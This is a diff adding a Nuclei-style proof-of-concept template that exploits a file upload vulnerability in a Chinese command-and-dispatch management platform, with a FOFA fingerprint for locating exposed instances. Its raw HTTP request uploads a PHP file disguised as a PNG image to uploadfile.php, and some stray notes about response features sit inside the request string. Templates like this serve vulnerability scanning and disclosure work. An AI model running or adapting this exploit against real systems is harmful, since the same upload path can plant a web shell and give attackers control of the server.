@@ -1,0 +1,73 @@
+id: poc-xp7958g2g275i9vs
+info:
+  name: 科立讯通信 指挥调度管理平台 uploadfile.php 存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xp7958g2g275i9vs'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xp7958g2g275i9vs
+    fofa: fid="S8N1l6lqjeQ+TmusVhHTVw=="
+http:
+- raw:
+  - 'POST /api/client/task/uploadfile.php HTTP/1.1
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imageapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+
+
+    Content-Disposition: form-data; name="uploadfile";filename="a.php"
+
+
+    Content-Type: image/png
+
+
+
+
+    <?php phpinfo(); ?>
+
+
+
+
+    ------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?successed)(?=.*?php).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
